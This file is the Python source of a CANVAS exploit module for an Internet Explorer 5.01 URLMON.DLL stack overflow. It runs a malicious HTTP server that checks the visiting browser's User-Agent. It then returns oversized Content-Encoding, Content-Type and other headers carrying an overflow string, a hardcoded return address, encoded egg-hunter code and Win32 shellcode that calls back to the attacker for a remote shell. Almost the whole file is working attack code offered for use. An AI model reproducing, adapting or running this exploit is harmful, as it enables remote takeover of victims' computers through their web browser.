#! /usr/bin/env python
"""
IE URLMON.DLL stack overflow


"""

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information
NAME="IE URLMON.DLL stack overflow"
VERSION="1.0"

CHANGES="""

1.0


"""


notes="""
Sample file to use with this:
<html>
<body>
<img src="http://192.168.1.104:8080/image.jpg">
</body>
</html>
"""

#http://www.immunityinc.com/CANVAS/
#Questions, comments: dave@immunityinc.com
#

import os,getopt
import socket
from exploitutils import *
from encoder import addencoder
from shellcode import win32shell, linuxshell
import time
from tcpexploit import tcpexploit
import urllib
from sunrpc import *
import random
import xdrlib

import httplib
import urllib

from telnetlib import Telnet

import canvasengine

from shelllistener import shelllistener
from shelllistener import shellfromtelnet


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.setPort(8080)
        self.setHost("")
        self.setVersion(1)
        self.timeout=100
        #see imaptest.py
        self.badstring="\x00\\/%\",\r\n"
        self.geteipDict={}
        #jmp esp for IE
        #msafd Win2K SP3
        #self.geteipDict[1]=0x74fd2d57
        #SAMLIB Win2K SP3
        #self.geteipDict[1]=0x7515366B
        #MSHTML:.txt
        #self.geteipDict[1]=0x75b9408c
        #self.geteipDict[1]=0x75b9433c
        #self.geteipDict[1]=0x75b94344
        #TAPI.text
        #self.geteipDict[1]=0x7754a3ab
        #CLBCATQ.text
        #self.geteipDict[1]=0x775c2966
        #URLMON.text
        self.geteipDict[1]=0x77690b79
        #Test
        self.geteipDict[2]=0x01020304
        self.client=None
        #used for search shellcode
        self.tag1="AACC"
        self.tag2="ACAC"
        return

    def test(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        s.bind(("0.0.0.0",self.port))
        s.set_timeout(self.timeout)
        try:
            self.log("Listening for connection on port %d"%(self.port))
            s.listen(5)
        except:
            self.log("Failed to listen.")
            return 0

        newfd=s.accept()
        s2=newfd[0]
        #save it off if we're doing autoRun
        self.client=s2
        thost=newfd[1][0]
        tport=newfd[1][1]
        self.log( "Connection from %s:%s"%(thost,tport))
        data=s2.recv(500)
        self.log(data)
        if data.find("User-Agent: ")==-1:
            return 0
        lines=data.split("\n")
        ver=""
        for l in lines:
            a=l.find("User-Agent: ")
            if a==-1:
                continue
            #otherwise we've found our user agent string
            ver=l
        if ver=="":
            return 0
        self.log("Agent is %s"%ver)
        if ver=="User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)\r":
            self.setVersion(1)
            return 1
        
        return 0
        
    
    def createShellcode(self,localhost,localport):
        
        self.log( "Calling back to %s:%s"%(localhost,localport))
        self.createWin32Shellcode(self.badstring,localhost,localport)
        self.shellcode=self.tag2+self.tag1+self.shellcode
        self.searchcode=win32shell.getsearchcode(self.tag1,self.tag2)
        encoder=addencoder.inteladdencoder()
        encoder.setbadstring(self.badstring)
        #we need to solve a little problem with esp being
        #in our string by subtracting from esp
        SUBESP5000=binstring("81 ec")+intel_order(5000)
        self.searchcode=SUBESP5000+self.searchcode
        self.encodedsearchcode=encoder.encode(self.searchcode)
        if not self.encodedsearchcode:
            return None
        self.log("Length of search shellcode: %d, length of real shellcode: %d\n"%(len(self.searchcode), len(self.shellcode)))
        #print prettyprint(self.encodedsearchcode)
        return 1
        
            
    def neededListenerTypes(self):
        return [canvasengine.WIN32LISTENER]


    def runAuto(self):
        if (self.test()):
            self.log("Using version %s"%self.version)
            self.run()
        else:
            self.log("Test reported not vulnerable")
        
    def run(self):
        debug=0
        if debug:
            a=330
            b=350
            stuff=prettyprint(self.shellcode[a:b])
            print "Shellcode[%d : %d]=%s"%(a,b,stuff)
            #import sys
            #sys.exit(1)
        if self.client==None:
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
            s.set_timeout(self.timeout)
            s.bind(("0.0.0.0",self.port))
            try:
                self.log("Listening for connection on port %d"%(self.port))
                s.listen(5)
            except:
                self.log("Failed to listen.")
                return 0

            newfd=s.accept()
            s2=newfd[0]
            #save it off if we're doing autoRun
            self.client=s2
            thost=newfd[1][0]
            tport=newfd[1][1]
            self.log( "Connection from %s:%s"%(thost,tport))
            data=s2.recv(500)
            self.log(data)
            if data.find("User-Agent: ")==-1:
                return 0
            lines=data.split("\n")
            ver=""
            for l in lines:
                a=l.find("User-Agent: ")
                if a==-1:
                    continue
                #otherwise we've found our user agent string
                ver=l
            if ver=="":
                return 0
            self.log("Agent is %s"%ver)
        else:
            s=self.client
        body=self.makesploit()
        s.send(body)
        self.log("Reading from client")
        data=s.recv(500)
        self.log("Client returned: %s"%data)
        return None
    
   
    #returns the sploitstring
    def makesploit(self):
        debug=0
        if debug:
            print "Raw Length is %d"%len(self.searchcode)
            print "Encoded Length is %d"%len(self.encodedsearchcode)
            a=160
            b=180
            stuff=urlencode(self.searchcode[a-180+135:b-180+135])
            stuff2=urlencode(self.encodedsearchcode[a:b])
            print "Raw Shellcode    [%d : %d]=%s"%(a,b,stuff)
            print "Encoded Shellcode[%d : %d]=%s"%(a,b,stuff2)
            #import sys
            #sys.exit(1)
            
        geteip=self.geteipDict[self.version]
        attackstring=""
        if self.version==2:
            print "Version 2"
            attackstring+="%25n"*5000

        attackstring+="A"*296
        attackstring+=intel_order(geteip)
        attackstring=stroverwrite(attackstring,self.encodedsearchcode,50)
        #jump back into our exploit string
        attackstring+=binstring("e9 f7feffff")
        data=""
        data+="200 HTTP/1.1 Ok\r\n"
        data+="Shellcode: %s\r\n"%self.shellcode
        data+="Content-Length: 0\r\n"
        data+="Content-Encoding: %s\r\n"%attackstring
        data+="Content-Type: %s\r\n"%attackstring
        data+="Last-Modified: Sat, 26"+"A"*5000+" Oct 2002 14:47:45 GMT\r\n"
        data+="ETag: \"20ef82-410d-3dbaab11"+"A"*5000+"\"\r\n"
        data+="Date: Wed, 16 Jul 2003 17:13:44 GMT"+"A"*5000+"\r\n"
        #end the headers
        data+="\r\n\r\n"
        #data+="A"*600
        #data+="\xcc"
        #data+=self.shellcode
        return data


def printversions():
    print "Versions: "
    print "\t1 - IE 5.01"
    return

def usage():
    import sys
    print "Usage: "+sys.argv[0]+" -l localhost -d localport [-p port:8080] [-v version:1] [-T: just do test] [-a: run auto]"
    printversions()
    sys.exit(0)
    
    
#this stuff happens.
if __name__ == '__main__':

    print "Running CANVAS " +NAME+" exploit version "+VERSION
    app = theexploit()
    version=1
    
    try:
        (opts,args)=getopt.getopt(sys.argv[1:],"t:p:v:l:d:Ta")
    except getopt.GetoptError:
        #print help
        usage()
        
    
    i=0
    testing=0
    auto=0
    for o,a in opts:
        if o in ["-p"]:
            app.setPort(int(a))            
        if o in ["-l"]:
            localhost=a
            i+=1
        if o in ["-d"]:
            localport=a
            i+=1
        if o in ["-v"]:
            app.setVersion(int(a))
        if o in ["-T"]:
            testing=1
        if o in ["-a"]:
            auto=1

    if i<2 and not testing:
        print "Only got %d args"%i
        usage()



    print "Using port %d" % int(app.port)

    if testing:
        if (app.test()):
            print "System reported vulnerable (version %d)"%app.version
        else:
            print "System reported not-vulnerable"
        sys.exit(1)


    print "Encoding shellcode. This may take a while."
    app.createShellcode(localhost,localport)
    if app.version==1 and app.shellcode=="":
        print "Could not encode shellcode"
        sys.exit(0)

    if auto:
        app.runAuto()
    else:
        app.run()
        
    print "Done with "+NAME
    
